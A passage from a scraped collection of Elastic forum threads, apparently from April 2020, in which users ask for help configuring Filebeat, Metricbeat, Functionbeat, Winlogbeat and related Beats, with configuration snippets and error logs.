    "title": "Filebeat loading index template JSON not working",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Kupauw",
    "date": "April 17, 2020, 12:34pm",
    "body": "Hi, I'm trying to load a custom index template as JSON. This is the filebeat configuration im using: setup.template.json.enable: true setup.template.json.path: \"index_template_perimeter.json\" setup.template.json.name: \"template-perimeter\" setup.template.enabled: false # Disable automatisch aanmaken van default filebeat ILM setup.ilm.enabled: false # Globaal ILM aanlaten ilm.enabled: true # Configuratie van de input filebeat.inputs: - type: netflow enabled: true max_message_size: 10KiB host: \"xx.xx.xx.xx:2055\" protocols: v9 expiration_timeout: 0 # Locatie van de benodigde modules (netflow) filebeat.config.modules: path: ${path.config}/modules.d/*.yml reload.enabled: false #reload.period: 10s # Configuratie van de output output.elasticsearch: username: \"xxxx\" password: \"xxxx\" protocol: https hosts: [\"xxxx:9200\", \"xxxx:9200\", \"xxxx:9200\"] bulk_max_size: 256 worker: 3 indices: - index: \"perimeter\" when.contains: observer.ip: \"10.1.254\" output.elasticsearch.ssl.certificate_authorities: [\"xxx\"] output.elasticsearch.ssl.certificate: \"xxx\" output.elasticsearch.ssl.key: \"xxx\" The JSON that im trying to load: { \"index_patterns\": [\"perimeter-*\"], \"settings\": { \"number_of_shards\": 3, \"number_of_replicas\": 1, \"index.lifecycle.name\": \"ilm-perimeter\", \"index.lifecycle.rollover_alias\": \"perimeter\" }, \"mappings\": { \"properties\": { \"destination.ip\": { \"type\": \"ip\" }, \"netflow.destination_ipv4_address\": { \"type\": \"ip\" }, \"netflow.post_nat_destination_ipv4_address\": { \"type\": \"ip\" }, \"netflow.post_nat_source_ipv4_address\": { \"type\": \"ip\" }, \"netflow.source_ipv4_address\": { \"type\": \"ip\" }, \"observer.ip\": { \"type\": \"ip\" }, \"source.ip\": { \"type\": \"ip\" }, \"destination.bytes\": { \"type\": \"byte\" }, \"network.bytes\": { \"type\": \"byte\" }, \"source.bytes\": { \"type\": \"byte\" } } } } Im wondering does the setup.template.enabled: false option must be enabled to load a custom JSON template? Because when i enable it it just loads the default filebeat-7.6.2- template and not my custom one. When i set the option to false it also never loads my custom template.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d05509ef-b4f8-4637-be7a-8eb086ba9a2a",
    "url": "https://discuss.elastic.co/t/about-mac-system-cannot-be-cross-compiled-into-windows/227458",
    "title": "About Mac system cannot be cross-compiled into windows",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "",
    "date": "April 10, 2020, 8:33am April 17, 2020, 9:48am April 17, 2020, 12:13pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f3a019d2-9f79-4efe-adac-1b46e8c3fe93",
    "url": "https://discuss.elastic.co/t/custom-field-not-appearing-in-o-p-for-iis-yml-module/227663",
    "title": "Custom field not appearing in o/p for IIS.yml module",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 12, 2020, 10:00am April 13, 2020, 11:04pm April 17, 2020, 11:47am April 17, 2020, 11:48am",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "629e74a9-22db-4e0e-b36e-540eb170ef8c",
    "url": "https://discuss.elastic.co/t/configure-aws-log-group-subscriptions-without-triggers-in-functionbeat-yml-file/228169",
    "title": "Configure AWS Log Group Subscriptions without Triggers in Functionbeat.yml file",
    "category": [
      "Beats",
      "Functionbeat"
    ],
    "author": "PhilipMortiboy",
    "date": "April 15, 2020, 4:26pm April 16, 2020, 7:33am April 16, 2020, 1:01pm April 17, 2020, 11:42am",
    "body": "We're attempting to configure a Functionbeat that subscribes to multiple CloudWatch Log Groups across our stacks. These stacks are created dynamically through independent CI/CD pipelines, so we'd like the responsibility of establishing a subscription to the Functionbeat to lie with the stacks generating the logs, not the Functionbeat. This will allow us to have a single Functionbeat stack, with new stacks subscribing to it as they are created, and removing their subscription as they are deleted. In theory this should be possible by adding a Subscription Filter to each stack, as below FunctionbeatLambdaLogGroupSubscription: Properties: DestinationArn: arn:my-functionbeat-function FilterPattern: \"\" LogGroupName: /aws/lambda/my-log-group Type: 'AWS::Logs::SubscriptionFilter' However, when I try to set up the subscription in this way, without specifying any triggers in my Functionbeat.yml file, I receive the following error when my Functionbeat is executed: Exiting: error when creating the functions, error: you need to specify at least one trigger accessing 'functionbeat.provider.aws.functions.0' (source:'functionbeat.yml') I take from this that it is required to list out each Log Group that the Functionbeat should be triggered by. Is this just a validation step, or is there some logic within the Functionbeat that requires it to have this configuration on top of the Log Group subscription? From this thread, (https://github.com/elastic/beats/issues/10756) it doesn't sound like its possible to wildcard these Triggers. Listing out each Log Group to subscribe to isn't feasible in our case, and I imagine in many others. Is it possible to configure a Functionbeat without specifying these triggers in its configuration? And if not, is this something that's under consideration for a future release? Or is there another architecture approach we should be considering for this that Functionbeat was designed for Thanks",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "99778933-3a8f-4151-8b8a-b296f1c8844e",
    "url": "https://discuss.elastic.co/t/functionbeat-deployment-to-multiple-environments/228476",
    "title": "Functionbeat - deployment to multiple environments",
    "category": [
      "Beats"
    ],
    "author": "Vaidotas",
    "date": "April 17, 2020, 8:43am",
    "body": "I couldn't find this in documentation, so was hoping someone will be able to clarify. What is expected flow of deployment of Functionbeat to multiple environments? Specific problem scenario I want to deploy it to multiple environments and have field which represents environment name e.g. fields \"environment\"=\"prod\"/\"dev\"/.... Each environment for Lambda has ENVIRONMENT variable set. However the problem is that when building (ziping) `functionbeat.yml` I have no idea on which environment it will be deployed, so all `{...}` environment variable usages have no desired effect - they access machine which is building, not the one on which it will be running. I also tried to look at things like decode_json_fields, copy_fields processor configurations to extract environment info from log event itself, but it looks a bit limited and documentation lacking to come up with something useful. Would be very thankful to any ideas.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "daa0e7f8-3e67-4564-9177-ef1fc1e8973b",
    "url": "https://discuss.elastic.co/t/winlogbeat-loses-some-events-from-microsoft-iis-logging-logs/227513",
    "title": "Winlogbeat loses some events from Microsoft-IIS-Logging/Logs",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "",
    "date": "April 10, 2020, 1:59pm April 17, 2020, 7:10am",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2e46b98b-0da7-479c-ad0f-7dbee1a5af62",
    "url": "https://discuss.elastic.co/t/index-creation-time-missing-in-index-metricset/228139",
    "title": "Index creation time missing in `index` metricset",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Alessio_Creo",
    "date": "April 15, 2020, 2:28pm April 16, 2020, 7:23am April 16, 2020, 9:44am April 17, 2020, 6:40am",
    "body": "Hi, I'm trying to build a dashboard to gather all the metrics of my Elastic Stack environment using metricbeat data. Using the index metricset in metribeat I've seen that there are missing information as index_creation_time reported instead in .monitoring-es* indices. I want to show, in the dashboard, the metrics of the indices created \"today\" but without the index_creation_time field is impossible to achieve without further operation on the metricbeat index. Is possible to retrieve this info without manipulating or enriching the data with logstash/ingest pipelines? Thank you very much. Alessio",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "63600df6-c619-4f85-a844-d1603589e5a7",
    "url": "https://discuss.elastic.co/t/host-name-field-winlogbeat-fqdn-vs-filebeat-shortname/228398",
    "title": "Host.name field winlogbeat (FQDN) vs filebeat (shortname)",
    "category": [
      "Beats"
    ],
    "author": "jimmburton",
    "date": "April 16, 2020, 8:12pm",
    "body": "I have built a brand new 7.6.2 cluster and I am testing SIEM with it as well as making some changes in the architecture and index layout from my old 6.x cluster I have updated a few times. I have a windows system where I have auditbeat and winlogbeat installed and sending directly to the ES cluster as an output. I have noticed that the host.name field is set to the FQDN from winlogbeat, and the short name is used with auditbeat. This causes the SIEM dashboard to see 2 hosts one with FQDN and one with short name due to the host.name field being different. I have looked at the logs and the \"Beat name:\" is set to the short name for both beats. Is there a way to make the host.name field the shortname of the host fro auditbeat on a windows system?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "201ba6f4-4ffb-4bfb-b44c-037591ddff2e",
    "url": "https://discuss.elastic.co/t/provide-back-ec2-tags-as-metadata/228386",
    "title": "Provide Back EC2 Tags as metadata",
    "category": [
      "Beats"
    ],
    "author": "",
    "date": "April 16, 2020, 5:39pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6dc1bf70-12a8-4633-8032-f4aa717c0a41",
    "url": "https://discuss.elastic.co/t/filebeat-compatibility-issue-for-oracle-enterprise-linux-environment-oel/228358",
    "title": "Filebeat compatibility issue for Oracle Enterprise Linux environment (OEL)",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "rkcharlie",
    "date": "April 16, 2020, 3:41pm",
    "body": "Hello Team, We have configured Filebeat in Oracle Enterprise Linux environment. As per Elastic support matrix, OEL doesn't support beats. We have noticed that, OEL environment Filebeat output is not matching with Windows environment Filebeat output on the same data, Looking for suggestions please. Please find the below matricsupport link https://www.elastic.co/support/matrix Thanks & Regards, Ram krishna",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "68fe1428-0e87-4624-af39-eeb37ada9a16",
    "url": "https://discuss.elastic.co/t/metricbeat-authentication/228055",
    "title": "Metricbeat authentication",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "ranjan300",
    "date": "April 15, 2020, 8:37am April 15, 2020, 1:55pm April 15, 2020, 2:06pm April 16, 2020, 1:38pm April 16, 2020, 1:40pm",
    "body": "is it possible to use aws iam roles instead of aws credentials (access key and secret key) for authentication. Can anyone please help me.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "f34ff582-1f8c-4932-b0d9-0b6b944ae466",
    "url": "https://discuss.elastic.co/t/decode-json-data-from-kubernetes-pods/228297",
    "title": "Decode json data from Kubernetes Pods",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "malcolm666",
    "date": "April 16, 2020, 10:29am April 17, 2020, 6:33am",
    "body": "Hi! I have a question about parsing JSON log messages produced by Kubernetes deployments in filebeat 7.6.2. I read this article but it doesn't help. I have such ConfigMap: apiVersion: v1 kind: ConfigMap metadata: namespace: kube-logging name: filebeat-config labels: app: filebeat data: filebeat.yml: |- filebeat.autodiscover: providers: - type: kubernetes hints.enabled: true include_annotations: [\"json_logs\"] templates: - condition: or: - equals: kubernetes.namespace: cis - equals: kubernetes.namespace: kube-logging config: - type: container paths: - /var/log/containers/*-${data.kubernetes.container.id}.log exclude_lines: [\"^\\\\s+[\\\\-`('.|_]\"] # drop asciiart lines processors: decode_json_fields: fields: [\"message\"] process_array: true target: \"\" keys_under_root: true overwrite_keys: false add_error_key: true processors: - drop_event: when.or: - and: - regexp: message: '^\\d+\\.\\d+\\.\\d+\\.\\d+ ' - equals: fileset.name: error - and: - not: regexp: message: '^\\d+\\.\\d+\\.\\d+\\.\\d+ ' - equals: fileset.name: access - add_cloud_metadata: - add_kubernetes_metadata: - add_docker_metadata: output.elasticsearch: hosts: ['${ELASTICSEARCH_HOST:elasticsearch}:${ELASTICSEARCH_PORT:9200}'] username: ${ELASTICSEARCH_USERNAME} password: ${ELASTICSEARCH_PASSWORD} setup.kibana: host: '${KIBANA_HOST:kibana}:${KIBANA_PORT:5601}' setup.dashboards.enabled: true setup.template.enabled: true setup.ilm: policy_file: /etc/indice-lifecycle.json I have kibana deployment that (as I see) sends the logs in json format. I get kibana log's and in Kibana UI I see this logs but just as a simple string, without parsing it as a json. There are no errors in logs of filebeat. Please, help me with parsing json logs.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ab530b07-4946-4104-9f12-3e4980d5ece2",
    "url": "https://discuss.elastic.co/t/monitor-websites-from-multiple-locations/228275",
    "title": "Monitor Websites from Multiple locations",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "haneefh",
    "date": "April 16, 2020, 8:19am April 18, 2020, 11:30am",
    "body": "Hi I am trying to setup http monitors using heartbeat for websites from multiple locations. I am using add_observer_metadata to do this , but would it be possible to monitor a site from multiple locations using this feature. I am able to do it from one location per site",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "82c9076b-eb27-4492-841a-a3b3bacf4f4f",
    "url": "https://discuss.elastic.co/t/packebeat-dashboard-on-kibana-error/228307",
    "title": "Packebeat dashboard on kibana error",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "oumy",
    "date": "April 16, 2020, 11:31am",
    "body": "Hey there, I have to VM's, on one packetbeat, the other kibana. When i try to load it's dashboard it give the error code Exciting: error connecting to kibana : fail to get the kibana version : HTTP GET request to http://IP_add:5601. How am I supposed to fix this ? thank you oumy",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "69ced236-eead-4626-9d58-b3e429f7b311",
    "url": "https://discuss.elastic.co/t/udp-127-0-0-1-bind-address-already-in-use-in-7-6-netflow-module/228222",
    "title": "Udp 127.0.0.1:2055: bind: address already in use in 7.6 netflow module",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Dmitry1",
    "date": "April 15, 2020, 11:53pm April 16, 2020, 7:13am April 16, 2020, 9:16am April 16, 2020, 9:49am",
    "body": "Hi, i've upgraded filebead from 7.5.2 to 7.6.2 and now filebeat constantly complain: 2020-04-16T02:38:48.587+0300 INFO crawler/crawler.go:72 Loading Inputs: 2 2020-04-16T02:38:48.587+0300 INFO input/input.go:114 Starting input of type: netflow; ID: 8714833438451968066 2020-04-16T02:38:48.587+0300 INFO [netflow] netflow/input.go:153 Starting UDP input 2020-04-16T02:38:48.588+0300 INFO [udp] udp/server.go:81 Started listening for UDP connection {\"address\": \"0.0.0.0:2055\"} 2020-04-16T02:38:48.590+0300 INFO crawler/crawler.go:106 Loading and starting Inputs completed. Enab2020-04-16T02:38:48.630+0300 INFO [netflow] netflow/input.go:153 Starting UDP input 2020-04-16T02:38:48.630+0300 ERROR [netflow] netflow/input.go:164 Error running harvester: listen udp 127.0.0.1:2055: bind: address already in use led inputs: 1 2020-04-16T02:38:58.630+0300 INFO [netflow] netflow/input.go:153 Starting UDP input 2020-04-16T02:38:58.631+0300 ERROR [netflow] netflow/input.go:164 Error running harvester: listen udp 127.0.0.1:2055: bind: address already in use 2020-04-16T02:39:08.631+0300 INFO [netflow] netflow/input.go:153 Starting UDP input 2020-04-16T02:39:08.632+0300 ERROR [netflow] netflow/input.go:164 Error running harvester: listen udp 127.0.0.1:2055: bind: address already in use netflow input in felibeat.yml defined as: filebeat.inputs: - type: netflow max_message_size: 10KiB host: \"0.0.0.0:2055\" protocols: [ v5, v9, ipfix ] expiration_timeout: 30m queue_size: 8192 detect_sequence_reset: true why it complain about 127.0.0.1:2055 ? There is nobody listen to udp port 2055 before I start filebeat Moreover if I rollback to filebeat 7.5.2 - all errors about \"bind: address already in us\" are disappeared.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "ff3e3cd3-b3bf-450b-9762-e4d019dda248",
    "url": "https://discuss.elastic.co/t/winlog-computer-name/228190",
    "title": "Winlog.computer_name",
    "category": [
      "Beats"
    ],
    "author": "bca",
    "date": "April 15, 2020, 6:49pm April 16, 2020, 7:17am",
    "body": "I'm relatively new to this field and looking for information on what I should look for when troubleshooting specific winlog._ or event._ data. Where would be the best place to look? I've already gone through the Export Field definitions list, but need to expand on. i.e. more than winlog.computer_name - look for computer name changes",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f7b93dd5-8f0e-4d84-8a4f-45402911c654",
    "url": "https://discuss.elastic.co/t/filebeat-not-generating-service-logs-in-windows-10/228245",
    "title": "Filebeat not Generating Service Logs in Windows 10",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "oneoneonepig",
    "date": "April 16, 2020, 5:31am April 16, 2020, 5:36am April 16, 2020, 6:04am April 16, 2020, 7:11am",
    "body": "Filebeat is not generating service logs. It was installed using the script \".\\install-service-filebeat.ps1\" It was generating logs few hours ago, it stops generating logs after I deleted the \"logs\" directory. All configurations are left default with only changing output from Elasticsearch to Logstash. OS version: Windows 10 version 1909 (OS Build 18363.778) Filebeat version: filebeat version 7.6.2 (386), libbeat 7.6.2 [d57bcf8684602e15000d65b75afcd110e2b12b59 built 2020-03-26 05:25:24 +0000 UTC]",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a2180155-0412-49e0-984c-b371e79e9144",
    "url": "https://discuss.elastic.co/t/azure-module-error/227210",
    "title": "Azure Module Error",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "craigothy",
    "date": "April 8, 2020, 9:36pm April 9, 2020, 11:48am April 9, 2020, 3:49pm April 12, 2020, 2:50pm April 9, 2020, 8:05pm April 10, 2020, 10:06am April 10, 2020, 5:53pm April 10, 2020, 5:58pm April 10, 2020, 7:45pm April 10, 2020, 11:25pm April 11, 2020, 5:46am April 14, 2020, 9:08am April 15, 2020, 9:40pm April 16, 2020, 6:20am",
    "body": "Using version 7.6.1 I am getting an error when starting filebeat with the azure module enabled. Any ideas what could be causing this? Thank you. 2020-04-08T21:35:17.140-0500 INFO [azure-eventhub input] azureeventhub/input.go:110 azure-eventhub input worker has started. {\"connection string\": \"Endpoint=sb://myeventhub.servicebus.usgovcloudapi.net/;SharedAccessKeyName=siemRead;SharedAccessKey=mybase64hubkey\"} 2020-04-08T21:35:25.119-0500 INFO [azure-eventhub input] azureeventhub/eph.go:57 handler id: \"dd6c53e7-6838-4ad5-aa7e-3cdfc3a96c21\" is running {\"connection string\": \"Endpoint=sb://myeventhub.servicebus.usgovcloudapi.net/;SharedAccessKeyName=siemRead;SharedAccessKey=mybase64hubkey\"} ______ __ __ __ __ / ____/ _____ ____ / /_/ / / /_ __/ /_ _____ / __/ | | / / _ \\/ __ \\/ __/ /_/ / / / / __ \\/ ___/ / /___ | |/ / __/ / / / /_/ __ / /_/ / /_/ (__ ) /_____/ |___/\\___/_/ /_/\\__/_/ /_/\\__,_/_.___/____/ => processing events, ctrl+c to exit 2020-04-08T21:35:25.925-0500 ERROR [azure-eventhub input] azureeventhub/input.go:116 -> github.com/elastic/beats/vendor/github.com/Azure/azure-storage-blob-go/azblob.newStorageError, /go/src/github.com/elastic/beats/vendor/github.com/Azure/azure-storage-blob-go/azblob/zc_storage_error.go:42 ===== RESPONSE ERROR (ServiceCode=AuthenticationFailed) ===== Description=Server failed to authenticate the request. Make sure the value of Authorization header is formed correctly including the signature. RequestId:5f20619e-c01e-00a4-53ec-0d31eb000000 Time:2020-04-08T21:25:40.5976395Z, Details: AuthenticationErrorDetail: The MAC signature found in the HTTP request 'vM/30x3+MUzUsENlTjDGIWd9fKEW0wq1kg+lndUZSqQ=' is not the same as any computed signature. Server used following string to sign: 'GET x-ms-client-request-id:b8f6bd7e-767f-4825-4487-75b49e28579c x-ms-date:Thu, 09 Apr 2020 02:35:25 GMT x-ms-version:2018-11-09 /mystorageacct/ comp:list prefix:filebeat-siemazurediag timeout:61'. Code: AuthenticationFailed GET https://mystorageacct.blob.core.windows.net?comp=list&prefix=filebeat-siemazurediag&timeout=61 Authorization: REDACTED User-Agent: [Azure-Storage/0.7 (go1.13.8; linux)] X-Ms-Client-Request-Id: [b8f6bd7e-767f-4825-4487-75b49e28579c] X-Ms-Date: [Thu, 09 Apr 2020 02:35:25 GMT] X-Ms-Version: [2018-11-09] -------------------------------------------------------------------------------- RESPONSE Status: 403 Server failed to authenticate the request. Make sure the value of Authorization header is formed correctly including the signature. Content-Length: [753] Content-Type: [application/xml] Date: [Wed, 08 Apr 2020 21:25:39 GMT] Server: [Microsoft-HTTPAPI/2.0] X-Ms-Error-Code: [AuthenticationFailed] X-Ms-Request-Id: [5f20619e-c01e-00a4-53ec-0d31eb000000] {\"connection string\": \"Endpoint=sb://myeventhub.servicebus.usgovcloudapi.net/;SharedAccessKeyName=siemRead;SharedAccessKey=mybase64hubkey\"} 2020-04-08T21:35:25.925-0500 INFO [azure-eventhub input] azureeventhub/input.go:117 azure-eventhub input worker has stopped. {\"connection string\": \"Endpoint=sb://myeventhub.servicebus.usgovcloudapi.net/;SharedAccessKeyName=siemRead;SharedAccessKey=mybase64hubkey\"}",
    "website_area": "discuss",
    "replies": 14
  },
  {
    "id": "d66f2ca1-44bb-4eca-9c1b-f2ce3e8f9856",
    "url": "https://discuss.elastic.co/t/metricbeat-does-not-respect-on-output-file-permissions/227325",
    "title": "Metricbeat does not respect on output.file.permissions",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "asp",
    "date": "April 9, 2020, 1:17pm April 9, 2020, 1:27pm April 10, 2020, 8:01pm April 16, 2020, 6:19am",
    "body": "Hi, my metricbeat config for file output is this: output.file: # Boolean flag to enable or disable the output module. enabled: True # Configure JSON encoding #codec.json: # Pretty-print JSON event #pretty: false # Configure escaping HTML symbols in strings. #escape_html: false # Path to the directory where to save the generated files. The option is # mandatory. path: \"/var/log/metricbeat/probes\" # Name of the generated files. The default is `metricbeat` and it generates # files: `metricbeat`, `metricbeat.1`, `metricbeat.2`, etc. filename: metricbeat_probes.log # Maximum size in kilobytes of each file. When this size is reached, and on # every Metricbeat restart, the files are rotated. The default value is 10240 # kB. rotate_every_kb: 10240 # Maximum number of files under path. When this number of files is reached, # the oldest file is deleted and the rest are shifted from last to first. The # default is 7 files. number_of_files: 3 # Permissions to use for file creation. The default is 0600. permissions: 0644 But the created files have 0640 permissions: [root@elastic01 probes]# pwd /var/log/metricbeat/probes [root@elastic01 probes]# ls -l total 68 -rw-r-----. 1 metricbeat metricbeat 68454 Apr 9 15:15 metricbeat_probes.log I am using metricbeat 7.5.2. I am running metricbeat as unprivilleged user called metricbeat. Any ideas how to solve this issue?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b6872d18-15a5-4816-9bab-66aeb6b275b6",
    "url": "https://discuss.elastic.co/t/help-with-heartbeat-setup-of-locations/227555",
    "title": "Help with heartbeat setup of locations",
    "category": [
      "Beats",
      "Heartbeat"
    ],
    "author": "Sketchy",
    "date": "April 10, 2020, 7:33pm April 14, 2020, 2:06am April 16, 2020, 5:13am",
    "body": "I have about 30 sites I would like to ping with heartbeat. I'm confused about how best to add the geo location and other info for each site. Do I add each site to its own yaml file or is there a simple way to do it all in one file? Sorry I'm new to beats and moving from another tool so I'm a little confused here, could someone show me an example of pinging multiple sites each with different location data?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2a3c896d-975e-4dcd-8c8c-ce72745dfb2c",
    "url": "https://discuss.elastic.co/t/netflow-module-7-6-only-one-of-two-exporters-is-being-parsed/228226",
    "title": "Netflow module (7.6): only one of two exporters is being parsed",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "bortok",
    "date": "April 16, 2020, 12:21am",
    "body": "I'm having trouble with receiving netflow from two different exporters by Filebeats Netflow module, ver 7.6. While one works just fine, the other one is completely ignored. I don't see any errors when it comes to parsing, or anything at all about the second one, even with debug logging. Confirmed with tcpdump the flows are being received from both, on the same port of the same interface. Exporters are different, but both are using v10 (IPFIX). I'm lost how to troubleshoot this. --Alex",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "6446e75e-9453-4c33-8e95-086069093aa5",
    "url": "https://discuss.elastic.co/t/problem-with-log-processing/227911",
    "title": "Problem with log processing",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 14, 2020, 12:36pm April 14, 2020, 1:10pm April 14, 2020, 5:44pm April 15, 2020, 1:01pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "2e519ded-8c69-4559-b38e-b481cfea7e3d",
    "url": "https://discuss.elastic.co/t/how-to-find-filebeat-docker-image-with-zero-vulnarabilties-the-current-image-of-filebeat-from-elastic-is-have-valnarabilties/228072",
    "title": "How to find filebeat docker image with zero vulnarabilties.the current image of filebeat from elastic is have valnarabilties",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Dragon9",
    "date": "April 15, 2020, 9:41am April 15, 2020, 9:58am April 15, 2020, 10:09am",
    "body": "my requirement is that i want filebeat alpine os based docker image .so i found from a third party but it not works .so suggest me how to solve my problem. the vulnarability found by snyk report",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "638f6c95-7b1a-4c7e-8c32-9e94dd3894c6",
    "url": "https://discuss.elastic.co/t/filter-system-logons/225001",
    "title": "Filter system logons",
    "category": [
      "Beats",
      "Winlogbeat"
    ],
    "author": "kickon",
    "date": "March 26, 2020, 10:49am April 15, 2020, 10:01am March 27, 2020, 12:25pm April 10, 2020, 5:18pm April 14, 2020, 5:50am April 14, 2020, 9:09am April 14, 2020, 2:06pm April 15, 2020, 8:08am April 15, 2020, 8:20am April 15, 2020, 10:01am April 15, 2020, 10:01am",
    "body": "hello, in new version of 7.6.1 I have issue with filtering system logons which occur in events 4624 and 4634. I tried this one with some modification https://github.com/HASecuritySolutions/Logstash/blob/master/winlogbeat_example.yml without succes , this one too : ignore_older: 72h processors: - drop_event.when.not.or: - equals.winlog.event_id: 4624 - equals.winlog.event_id: 4634 - contains.winlog.event_data.TargetUserName: \"SYSTEM\"' this one too : - drop_event: when: and: - equals: winlog.event_id: 4624 - regexp: winlog.event_data.TargetUserName: '.*\\$'' - name: Security ignore_older: 72h processors: - drop_event: when: equals: winlog.event_id: 4624 winlog.event_id: 4634 please help",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "f9098f63-f484-4969-8e9f-5684dba5de69",
    "url": "https://discuss.elastic.co/t/error-initializing-publisher-2-errors-open-etc-filebeat-cert-pem-no-such-file-or-directory/227096",
    "title": "Error initializing publisher: 2 errors: open /etc/filebeat/cert.pem: no such file or directory",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "",
    "date": "April 8, 2020, 10:27am April 17, 2020, 5:52pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "80adef73-1316-441c-b74f-62b62cd3ebef",
    "url": "https://discuss.elastic.co/t/problem-when-using-pipeline-with-filebeat-not-logstash-event-new/228069",
    "title": "Problem when using pipeline with filebeat (Not LogStash::Event.new)",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "nb03briceno",
    "date": "April 15, 2020, 9:37am",
    "body": "Hello everyone, I'm really concerned about a problem that I'm getting in my work. We developed an algorithm that allows us to create a new event in logstash each time that a certain pattern is matched, yet it is not working when we load the files using Filebeat. The next one is a fragment of the pipeline developed (working properly when we use file input i, but not working when we load with beats. input{...} filter{ grok { match => {\"message\" => \"%{TIMESTAMP_ISO8601:logdate} %{LOGLEVEL:logLevel} %{GREEDYDATA:result1} %{SPACE} %{GREEDYDATA:result2}:%{GREEDYDATA:result3}%{SPACE}:%{SPACE}<%{GREEDYDATA:max_text1} %{NUMBER:max} %{GREEDYDATA:max_text2}> %{SPACE}<%{GREEDYDATA:nonHeap_text1} %{NUMBER:nonHeap} %{GREEDYDATA:nonHeap_text2}> %{SPACE}<%{GREEDYDATA:total_text1} %{NUMBER:total} %{GREEDYDATA:total_text2}> %{SPACE}<%{GREEDYDATA:free_text1} %{NUMBER:free} %{GREEDYDATA:free_text2}> %{SPACE}<%{GREEDYDATA:consumed_text1} %{NUMBER:consumed} %{GREEDYDATA:consumed_text2}>\"} } if (\"_grokparsefailure\" in [tags]) { mutate { add_tag => [\"error2\"] remove_tag => [\"_grokparsefailure\"] } } else{ mutate { add_tag => [\"memory_value\"] } ruby { init => \"@free= '',@free_name='',@consumed='',@consumed_name='', @date='',@total='',@total_name='',@nonHeap='',@nonHeap_name='',@max='',@max_name='' \" code => \" require 'pry' @free= event.get('free') @free_name= event.get('free_text1') @consumed= event.get('consumed') @consumed_name= event.get('consumed_text1') @date= event.get('logdate') @total= event.get('total') @total_name= event.get('total_text1') @nonHeap= event.get('nonHeap') @nonHeap_name= event.get('nonHeap_text1') @max= event.get('max') @max_name= event.get('max_text1') generated = LogStash::Event.new generated.set('values',@free) generated.set('values_names',@free_name) generated.set('date_time',@date) new_event_block.call(generated) ....... output{......} The problem is the only event stored within the index is the grok matching, yet the generated event \"generated = LogStash::Event.new\" seems not to be working because is not been added to the index. And when running logstash and filebeat all apears to be good. There are limitations for creating events in logstash when using filebeat?? or using the ruby code ? The followings are the methods we need to use from ruby: -generated.set() -event.get() -LogStash::Event.new Thanks so much, This project is really important for the company I'm working with.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7561db8f-f356-4b0e-bce1-b1f47d626d4c",
    "url": "https://discuss.elastic.co/t/adding-metadata-with-autodiscover-is-not-working/227942",
    "title": "Adding metadata with autodiscover is not working",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Mario_Albo_Soria",
    "date": "April 15, 2020, 8:07am",
    "body": "Hi everybody, I'm trying to add docker and host metadata with autodiscover because I need docker.container.name and host.ip fields to correctly index my logs. I'm using autodiscover option because I only need to harvest kubelet logs. Component versions: Filebeat 7.6.2 Logstash 7.1 I have tried this two configurations but it don't seems to append any new field: First config: apiVersion: v1 kind: ConfigMap metadata: name: filebeat-config labels: k8s-app: filebeat data: filebeat.yml: |- filebeat.config: spool_size: 512 filebeat.autodiscover: providers: - type: docker processors: - add_docker_metadata: ~ - add_host_metadata: netinfo.enabled: true cache.ttl: 5m templates: - condition: contains: docker.container.name: kubelet config: - type: container paths: - /var/lib/docker/containers/${data.docker.container.id}/*.log exclude_lines: [\"^\\\\s+[\\\\-`('.|_]\"] output.file: path: \"/tmp/filebeat\" filename: filebeat Second config, very similar to the first one: apiVersion: v1 kind: ConfigMap metadata: name: filebeat-config labels: k8s-app: filebeat data: filebeat.yml: |- filebeat.config: spool_size: 512 filebeat.autodiscover: providers: - type: docker templates: - condition: contains: docker.container.name: kubelet config: - type: container paths: - /var/lib/docker/containers/${data.docker.container.id}/*.log exclude_lines: [\"^\\\\s+[\\\\-`('.|_]\"] processors: - 